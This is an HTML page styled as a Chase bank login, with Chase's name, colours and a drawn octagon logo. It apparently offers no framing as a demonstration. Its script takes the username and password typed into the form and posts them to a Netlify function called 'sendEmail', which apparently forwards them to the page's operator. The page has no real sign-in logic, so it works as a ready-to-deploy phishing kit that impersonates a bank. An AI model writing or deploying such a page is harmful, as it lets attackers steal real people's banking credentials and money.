<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Chase Login</title>
<style>
body {
font-family: Arial, sans-serif;
background-color: #e6f0fa; /* light Chase-style blue */
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}

.container {
background: #fff;
padding: 50px 40px;
border-radius: 12px;
width: 400px;
box-shadow: 0 6px 20px rgba(0,0,0,0.2);
text-align: center;
}

.logo {
display: flex;
align-items: center;
justify-content: center;
gap: 10px;
margin-bottom: 30px;
}

.logo h1 {
color: #0072CE;
font-family: Arial, sans-serif;
font-weight: bold;
margin: 0;
}

.logo svg {
width: 60px;
height: 60px;
}

input {
display: block;
width: 100%;
padding: 14px;
margin: 12px 0;
border-radius: 6px;
border: 1px solid #ccc;
font-size: 16px;
}

button {
width: 100%;
padding: 14px;
background-color: #0072ce;
color: #fff;
border: none;
border-radius: 6px;
font-size: 16px;
font-weight: bold;
cursor: pointer;
}

button:hover {
background-color: #005ea6;
}

#result {
margin-top: 18px;
font-weight: bold;
min-height: 24px;
}
</style>
</head>
<body>

<div class="container">

<!-- Chase text + logo -->
<div class="logo">
<h1>Chase</h1>
<svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
<!-- Outer blue octagon -->
<polygon fill="#0072CE" points="126,0 386,0 512,126 512,386 386,512 126,512 0,386 0,126"/>
<!-- Inner white octagon cutout -->
<polygon fill="#FFFFFF" points="180,0 332,0 512,180 512,332 332,512 180,512 0,332 0,180"/>
</svg>
</div>

<!-- Login form -->
<form id="loginForm">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>

<div id="result"></div>

</div>

<script>
const form = document.getElementById('loginForm');
const resultDiv = document.getElementById('result');

form.addEventListener('submit', async (e) => {
e.preventDefault();

const username = e.target.username.value;
const password = e.target.password.value;

try {
const res = await fetch('/.netlify/functions/sendEmail', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ username, password })
});

const data = await res.json();
resultDiv.innerText = data.message;
resultDiv.style.color = res.status === 200 ? 'green' : 'red';
} catch (err) {
resultDiv.innerText = 'Network error';
resultDiv.style.color = 'red';
}
});
</script>

</body>
</html>
